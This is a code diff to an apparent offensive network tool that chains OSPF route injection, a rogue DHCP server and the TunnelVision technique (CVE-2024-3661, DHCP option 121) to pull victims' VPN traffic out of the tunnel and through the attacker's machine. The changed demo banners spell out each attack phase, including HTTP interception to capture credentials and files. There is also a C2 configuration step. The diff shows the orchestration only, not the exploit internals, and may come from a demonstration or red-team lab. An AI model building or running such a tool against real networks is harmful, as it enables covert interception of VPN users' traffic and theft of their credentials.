@@ -74,19 +74,25 @@ from dhcp_takeover import (
 _demo_mode = False
 
 
-def demo_pause(label: str, hint: str | None = None) -> None:
-    """Print a labelled breakpoint and block until Enter is pressed."""
+def demo_pause(phase: str, next_action: str, verify: str | None = None) -> None:
+    """Gate execution before a phase: describe what is about to happen, then wait for Enter."""
     if not _demo_mode:
         return
+    import textwrap
     width = 66
     bar = "─" * width
     print(f"\n  ┌{bar}┐")
-    print(f"  │  DEMO  {label}")
-    if hint:
-        print(f"  │  Verify: {hint}")
+    print(f"  │  {phase}")
+    print(f"  │")
+    for line in textwrap.wrap(next_action, width=62):
+        print(f"  │  {line}")
+    if verify:
+        print(f"  │")
+        for line in textwrap.wrap(f"Verify: {verify}", width=62):
+            print(f"  │  {line}")
     print(f"  └{bar}┘")
     try:
-        input("  [Enter to continue] ")
+        input("  [Press Enter to proceed] ")
     except (EOFError, KeyboardInterrupt):
         print()
 
@@ -553,12 +559,9 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
     offer = offer_result[0]
 
     if offer:
-        demo_pause(
-            f"DHCP server discovered: {offer.get('server_id')} offered {offer.get('your_ip')} to us",
-            hint="tcpdump -i eth0 'udp port 67 or udp port 68'   or   show ip dhcp binding (on router)",
-        )
+        print_step("OK", f"DHCP server discovered: {offer.get('server_id')} offered {offer.get('your_ip')}")
     else:
-        demo_pause("DHCPDISCOVER sent — no OFFER received (proceeding without target DHCP server)")
+        print_step("WARN", "DHCPDISCOVER sent — no OFFER received (proceeding without target DHCP server)")
 
     # ── Step 3: default route via SVI ─────────────────────────────────────────
     default_route_added = ospf_adjacency.add_default_route(svi_ip, interface)
@@ -611,10 +614,6 @@ def setup_and_form_adjacency(interface, ospf_params, target_ip=None, vpn_subnets
         print_step("FAIL", "OSPF FULL adjacency not reached within 300s")
         raise TimeoutError(f"OSPF adjacency timeout on {interface}")
     print_step("OK", "OSPF FULL adjacency reached")
-    demo_pause(
-        f"OSPF FULL adjacency formed — /32 host route for {route_ip} injected into topology",
-        hint="show ip route ospf (on router)   or   ip route show (attacker)",
-    )
 
     return interface, our_ip, offer, dhcp_server_ip, lsdb_subnets, default_route_added, context
 
@@ -653,18 +652,21 @@ def main():
     c2_config = _init_c2(args)
 
     # ── Phase 1: passive OSPF Hello sniffing to learn SVI parameters ─────────
+    demo_pause(
+        "PHASE 1 — OSPF Reconnaissance & Adjacency Formation",
+        "Passively sniff OSPF Hello packets to learn the SVI network "
+        "parameters (area ID, hello/dead intervals, subnet mask). Then "
+        "form a full OSPF adjacency with the SVI and inject a /32 host "
+        "route into the topology to redirect victim DHCP traffic toward "
+        "this machine.",
+        verify="tcpdump -i eth0 proto ospf   |   show ip ospf neighbor   |   show ip route ospf",
+    )
     print_step("START", f"Passive OSPF Hello sniff on {interface} (timeout=30s)")
     ospf_hellos = ospf_adjacency.sniff_ospf_hellos(interface, timeout=30)
     if not ospf_hellos:
         print_step("FAIL", "No OSPF Hellos received — cannot learn SVI parameters. Aborting.")
         return
     ospf_params = ospf_hellos[0]  # use first SVI for adjacency
-    demo_pause(
-        f"OSPF Hello received — SVI {ospf_params['src_ip']} "
-        f"area={ospf_params['area_id']}  hello={ospf_params['hello_interval']}s  "
-        f"dead={ospf_params['dead_interval']}s  mask={ospf_params['netmask']}",
-        hint="tcpdump -i eth0 proto ospf   or   show ip ospf neighbor (on router)",
-    )
 
     # Enable IP forwarding early; save old value for teardown.
     saved_ip_forward = ospf_adjacency.enable_ip_forwarding()
@@ -705,6 +707,18 @@ def main():
             offer=offer,
         )
 
+        demo_pause(
+            "PHASE 3 — TunnelVision Exploitation (CVE-2024-3661)",
+            "Enable IP forwarding and configure iptables MASQUERADE and a "
+            "policy routing table so all forwarded victim traffic passes "
+            "through this machine. The rogue DHCP server will deliver "
+            "option-121 classless static routes alongside option 3, "
+            "forcing VPN-protected traffic to bypass the tunnel and "
+            "transit this host in plaintext. HTTP interception then "
+            "starts immediately after to capture credentials and files "
+            "from the resulting plaintext traffic.",
+            verify="ip rule show   |   ip route show table 100   |   iptables -t nat -L -n -v   |   ip link show tun0",
+        )
         # Pass pre-detected tun/subnet so enable_vpn_relay skips re-detection.
         tun_iface = vpn_relay.enable_vpn_relay(
             server_details, ospf_interface,
@@ -717,18 +731,6 @@ def main():
             ospf_interface, ospf_params["src_ip"],
             tun_iface=tun_iface,
             vpn_subnets=vpn_subnets if tun_iface else None,
-        )
-        demo_pause(
-            "iptables MASQUERADE + IP forwarding + policy routing table installed",
-            hint="iptables -t nat -L -n -v   and   ip rule show; ip route show table 100",
-        )
-
-        # ── Phase 6: HTTP interception on the traffic we now carry ───────────
-        demo_pause(
-            f"VPN relay {'active on ' + tun_iface if tun_iface else 'not available — passthrough mode'}"
-            f" — option-121 DHCP poison armed"
-            f" (next-hop={server_details.get('relay_ip', our_ip)})",
-            hint="ip link show tun0   or   ip route show dev tun0",
         )
         # Prefer the tunnel (plaintext VPN traffic); fall back to the physical
         # interface when there is no VPN relay.
@@ -767,10 +769,15 @@ def main():
                 name="debug-menu",
             ).start()
 
-        # ── Phase 7: rogue DHCP server (blocking) ────────────────────────────
+        # ── Phase 2: rogue DHCP server (blocking) ────────────────────────────
         demo_pause(
-            f"Rogue DHCP server ready to start — will answer victim DISCOVER/REQUEST as {server_details.get('source_ip', our_ip)}",
-            hint="tcpdump -i eth0 'udp port 67 or udp port 68'   and watch for OFFER from our IP",
+            "PHASE 2 — Rogue DHCP Server Deployment",
+            "Start the rogue DHCP server. It will race the legitimate "
+            "server to respond to victim DISCOVER and REQUEST messages "
+            "with poisoned leases: option 3 (default gateway) and "
+            "option 121 (classless static routes, CVE-2024-3661) both "
+            "pointing to this machine to establish the MITM position.",
+            verify="tcpdump -i eth0 'udp port 67 or udp port 68'   |   show ip dhcp binding",
         )
         relay_mode = (
             f"VPN relay via {tun_iface} → {server_details.get('opt121_subnets')}"
